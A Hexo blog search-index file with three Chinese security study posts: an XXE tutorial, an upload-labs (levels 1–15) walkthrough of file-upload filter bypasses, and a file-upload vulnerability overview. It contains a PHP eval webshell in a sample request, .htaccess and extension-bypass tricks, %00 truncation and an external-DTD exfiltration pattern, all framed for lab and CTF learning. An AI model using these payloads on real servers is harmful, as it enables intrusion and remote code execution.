<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>XXE</title>
    <url>/2020/11/11/XXE/</url>
    <content><![CDATA[<p><strong>XXE漏洞的学习与总结</strong></p>
<p><strong>XML基础</strong></p>
<p>了解xml文档的基础组成。<a id="more"></a></p>
<p>xml一般指可扩展标记语言。可扩展标记语言，标准通用标记语言的子集，简称<strong>XML</strong>。是一种用于标记电子文件使其具有结构性的标记语言。**<em>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素**</em></p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729131727597-973576085.png" alt="xml文件结构"></p>
<p><strong><em>xml文档的构建模块</em></strong></p>
<p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
<ul>
<li><p><input disabled type="checkbox">  元素</p>
</li>
<li><p><input disabled type="checkbox">  属性</p>
</li>
<li><p><input disabled type="checkbox">  实体</p>
</li>
<li><p><input disabled type="checkbox">  PCDATA</p>
</li>
<li><p><input disabled type="checkbox">  CDATA</p>
<p>下面是每个构建块的简要描述</p>
<p>1.元素</p>
<p>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p>
<p>2，属性<br>属性可提供有关元素的额外信息<br>实例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>3，实体<br>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
<p>4，PCDATA<br>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
<p>5，CDATA<br>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
<h3 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
<p>DTD 可以在 XML 文档内声明，也可以外部引用。</p>
<p>1，内部声明： ex: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYOE test any&gt;</span><br></pre></td></tr></table></figure>

<p>完整实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<p>2，外部声明（引用外部DTD）： ex:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test SYSTEM &#39;http:&#x2F;&#x2F;www.test.com&#x2F;evil.dtd&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>完整实例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt; </span><br></pre></td></tr></table></figure>

<p>而note.dtd的内容为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p><strong><em>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:<!ENTITY 实体名 "实体内容"><br>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 "实体内容"><br>引用实体的方式：%实体名；\</em></strong></p>
<p>1，内部实体声明:<!ENTITY 实体名称 "实体的值"> ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code><br>完整实例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>

<p><test>&writer;&copyright;</test></p>
<p><strong>2，外部实体声明:<!ENTITY 实体名称 SYSTEM "URI"></strong><br>完整实例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;123456</span><br></pre></td></tr></table></figure>

<p>在了解了基础知识后，下面开始了解xml外部实体注入引发的问题。</p>
<h2 id="XXE的攻击与危害（XML-External-Entity）"><a href="#XXE的攻击与危害（XML-External-Entity）" class="headerlink" title="XXE的攻击与危害（XML External Entity）"></a>XXE的攻击与危害（XML External Entity）</h2><p>1，何为XXE?<br>答： xxe也就是xml外部实体注入。也就是上文中加粗的那一部分。</p>
<p>2，怎样构建外部实体注入？<br>方式一：直接通过DTD外部实体声明<br>XML内容<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729140431597-914383211.png" alt="img"></p>
<p>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明<br>XML内容：<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729140617472-1523498833.png" alt="img"><br>DTD文件内容：<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729140640300-285141670.png" alt="img"></p>
<p>方式三：通过DTD外部实体声明引入外部实体声明<br>好像有点拗口，其实意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明<br>具体看例子,XML内容<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729141950472-1045381626.png" alt="img"></p>
<p>dtd文件内容：<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729142002394-1678808572.png" alt="img"></p>
<p>3，支持的协议有哪些？<br>不同程序支持的协议如下图：<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729141612957-759004042.png" alt="img"></p>
<p>其中php支持的协议会更多一些，但需要一定的扩展支持。</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729141643972-251925223.png" alt="img"></p>
<p>4，产生哪些危害？</p>
<p>XXE危害1：读取任意文件<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145026738-1407663000.png" alt="img"></p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145035082-1171815922.png" alt="img"></p>
<p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p>另外，数据不回显就没有问题了吗？如下图，<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145050972-1215502458.png" alt="img"></p>
<p>不，可以把数据发送到远程服务器，</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145104285-1507820174.png" alt="img"></p>
<p>远程evil.dtd文件内容如下：<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145111863-976147511.png" alt="img"></p>
<p>触发XXE攻击后，服务器会把文件内容发送到攻击者网站</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145120957-1229784360.png" alt="img"></p>
<p>XXE危害2：执行系统命令<br><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145129957-1907303428.png" alt="img"></p>
<p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
<p>XXE危害3：探测内网端口</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145153722-1549362415.png" alt="img"></p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145204847-766408731.png" alt="img"></p>
<p>该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p>
<p>XXE危害4：攻击内网网站</p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145220472-216779729.png" alt="img"></p>
<p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145231894-1025001344.png" alt="img"></p>
<p>该CASE是攻击内网struts2网站，远程执行系统命令。</p>
<h2 id="如何防御xxe攻击"><a href="#如何防御xxe攻击" class="headerlink" title="如何防御xxe攻击"></a>如何防御xxe攻击</h2><p>方案一、使用开发语言提供的禁用外部实体的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</p>
<p>Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
<p>方案二、过滤用户提交的XML数据<br>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-libs(1-15)</title>
    <url>/2020/11/16/upload-libs-1-15/</url>
    <content><![CDATA[<h1 id="upload-libs-1-15"><a href="#upload-libs-1-15" class="headerlink" title="upload-libs(1-15)"></a>upload-libs(1-15)</h1><h2 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h2><ol>
<li><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>upload-labs</code>是一个使用<code>php</code>语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
</li>
<li><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>1.每一关没有固定的通关方法，大家不要自限思维！</p>
<p>2.本项目提供的<code>writeup</code>只是起一个参考作用，希望大家可以分享出自己的通关思路。</p>
<p>3.实在没有思路时，可以点击<code>查看提示</code>。</p>
<p>4.如果黑盒情况下，实在做不出，可以点击<code>查看源码</code>。</p>
</li>
<li><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>如在渗透测试实战中遇到新的上传漏洞类型，会更新到<code>upload-labs</code>中。当然如果你也希望参加到这个工作当中，欢迎<code>pull requests</code>给我!</p>
<p>项目地址：<code>https://github.com/c0ny1/upload-labs</code></p>
</li>
</ol>
<p><strong>我是直接使用的压缩版（不用配环境）</strong></p>
<h2 id="二-pass1-5"><a href="#二-pass1-5" class="headerlink" title="二.pass1-5"></a>二.pass1-5</h2><h3 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h3><p>源码分析</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码中只是js前端校验。直接新建txt,写入一句话木马(<?php phpinfo(); ?>),改后缀为jpg、png、gif,然后bp抓包，改后缀，上传完成。</p>
<p>访问图片地址，拿到php版本信息，说明php脚本成功执行。</p>
<h3 id="pass02"><a href="#pass02" class="headerlink" title="pass02"></a>pass02</h3><p>MIME（Multipurpose Internet Mail Extensions）多用于互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p>
<p>核心作用：服务器判断你上传的是什么文件。其基本类型比如：</p>
<ul>
<li>{“.3gp”, “video/3gpp” }</li>
<li>{“.asp”, “application/x-asap” }</li>
<li>{“.avi”, “video/x-msvideo” }</li>
<li>{“.bmp”, “image/bmp” }</li>
<li>{“.cpp”, “text/plain” }</li>
<li>{“.jpe”, “image/jpeg” }</li>
<li>{“.mp4”, “video/mp4” }</li>
<li>…</li>
</ul>
<p>查看提示可以知道，对MIME检查即改造Content-Type，</p>
<p><img src="/2020/11/16/upload-libs-1-15/Myblogs\source_posts\upload-libs-1-15\Snipaste_2020-11-16_15-55-54.jpg"></p>
<p><img src="/2020/11/16/upload-libs-1-15/Myblogs\source_posts\upload-libs-1-15\Snipaste_2020-11-16_17-06-41.jpg"></p>
<p>将原来的Content-Type的内容改为image/jpeg</p>
<p>上传成功</p>
<h3 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h3><p>黑名单绕过</p>
<p>这一关是另类的文件名的绕过，可以尝试phtml，php3，php4, php5, pht后缀名都可以绕过，但是前提是要在配置文件里面有这样的一句话</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h3><p>使用.htaccess配置文件，</p>
<p>htaccess文件解释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</span><br></pre></td></tr></table></figure>

<p>说人话就是:</p>
<p>如果你上传一个jpg文件，利用htaccess文件可以将jpg当作php执行</p>
<p>htaccess文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php  &#x2F;&#x2F;将任意文件当作php文件执行</span><br></pre></td></tr></table></figure>

<p>或者写成这样</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">php</span>脚本的文件名&quot;&gt;</span></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>htaccess文件上传方法：</strong></p>
<p>上传1.htaccess,bp抓包，删掉文件名，完成。</p>
<p>接下来就可以上传图片马了</p>
<h3 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h3><p><img src="/2020/11/16/upload-libs-1-15/Myblogs\source_posts\upload-libs-1-15\Snipaste_2020-11-16_17-45-44.jpg"></p>
<p>双写文件后缀，例如上传1.php,可以写成1.pphphp， <em>Apache</em> 漏洞会只看它认识的后缀。</p>
<h3 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h3><p><strong><em>黑名单机制，可以利用windows特性，windows系统在生成文件时会自动去掉不符合规则符号后面的内容。windows下还可以通过上传test.php:1.jpg文件名来绕过后缀检查（6t,7t,8t均是）</em></strong></p>
<p>文件加空格，不要再win下加，win会删掉空格，直接bp抓包，改包，上传。</p>
<h3 id="pass-07"><a href="#pass-07" class="headerlink" title="pass-07"></a>pass-07</h3><p>文件后缀加“.”绕过。</p>
<h3 id="pass-08"><a href="#pass-08" class="headerlink" title="pass-08"></a>pass-08</h3><p>bp抓包 后缀名中加”::$DATA”绕过</p>
<h3 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h3><p>构造文件后缀名.点+空格+点绕过</p>
<h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只过滤了一次php，双写php绕过</p>
<h3 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h3><p>%00和0x00截断</p>
<p>直接在URL中添加%00：<br>POST /Pass-11/index.php?save_path=…/upload/1.php%00 HTTP/1.1</p>
<p>如果path在非enctype=multipart/form-data的表单中或URL or Cookie中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行URL解码即可。</p>
<h3 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h3><p>要在burp的二进制模式(Hex选项卡)添加0x00，因为post不会像get对%00进行自动解码。</p>
<p>00截断的原理可以参考<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html</a></p>
<h3 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h3><p>post型截断</p>
<p>这一关和Pass-12的区别是，00截断是用在POST中，且是在二进制中进行修改。因为POST不会像GET那样对%00进行自动解码。</p>
<h3 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h3><p>cmd制作方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 1.jpg&#x2F;a + 1.txt&#x2F;b 2.jpg &#x2F;&#x2F;1.jpg:原图片;1.txt:php代码;2.jpg:生成的含有木马的图片</span><br></pre></td></tr></table></figure>

<p>或使用工具</p>
<p>010Editor.exe，edjpgcom.exe</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器地址栏输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;include.php  &#x2F;&#x2F;原链接</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;include.php?file&#x3D;.&#x2F;upload&#x2F;XXX.jpg   &#x2F;&#x2F;upload&#x2F;XXX.jpg为图片地址</span><br></pre></td></tr></table></figure>

<h3 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h3><p>和14题一样.</p>
]]></content>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2020/11/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>最近参考了很多文章，结合以前整理的把文件上传的知识重新总结了一下，除了下面列举的这些姿势外(当然，有的还没列举到)，比赛中常见的形式就是上传题会结合源码泄露进行分析绕过。</p>
<a id="more"></a>

<p>上传时需要<strong>注意</strong>：</p>
<ul>
<li><p>服务器类型、后端语言及版本</p>
</li>
<li><p>是黑名单上传还是白名单上传</p>
</li>
<li><p>是否可以获得上传路径、上传的文件是否被改名或被删除、被渲染了</p>
</li>
</ul>
<h3 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h3><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令或影响服务端正常工作等能力。</p>
<p>上传的文件发挥其作用需要具备以下几个条件：</p>
<p>（1）上传的文件具备可执行性；</p>
<p>（2）用户可以从Web上访问这个文件，从而使得Web容器解释执行该文件；(就是你可以访问到你上传的这个文件)</p>
<p>（3）上传后的文件必须经过安全检查，不会被格式化、压缩等处理改变其内容；(文件的内容不会被修改)</p>
<h3 id="文件上传-Multipart-form-data"><a href="#文件上传-Multipart-form-data" class="headerlink" title="文件上传-Multipart/form-data"></a>文件上传-Multipart/form-data</h3><p>对于普通的HTML Form POST请求，它会在头信息里使用Content-Length注明内容长度。头信息每行一条，空行之后便是Body，即“内容”（entity）。它的Content-Type是application/x-www-form-urlencoded，这意味着消息内容会经过URL编码</p>
<p>最早的HTTP POST是不支持文件上传的；后来Content-Type的类型扩充了multipart/form-data用以支持向服务器发送二进制数据</p>
<p>用burp抓到文件上传的部分信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Length: 315</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryTUDdEg7S0viQZNs5</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer: http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web9&#x2F;index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: td_cookie&#x3D;2691609149; td_cookie&#x3D;2955167419</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryTUDdEg7S0viQZNs5</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;caidao.php&quot;</span><br><span class="line">Content-Type: image&#x2F;png  </span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryTUDdEg7S0viQZNs5</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundaryTUDdEg7S0viQZNs5--</span><br></pre></td></tr></table></figure>

<p>第一个空行前时HTTP header，后面则是entity，即内容</p>
<p>需要选择一段数据作为“分割边界”（boundary属性），这个“边界数据”不能在内容其他地方出现，每次post浏览器都会生成一个随机的30-40位长度的随机字符串</p>
<p>选择了这个边界之后，浏览器便把它放在Content-Type里面传递给服务器，服务器根据此边界解析数据。下面的数据便根据boundary划分段，每一段便是一项数据。(每个field被分成小部分，而且包含一个value是”form-data”的”Content-Disposition”的头部；一个”name”属性对应field的ID,等等，文件的话包括一个filename)</p>
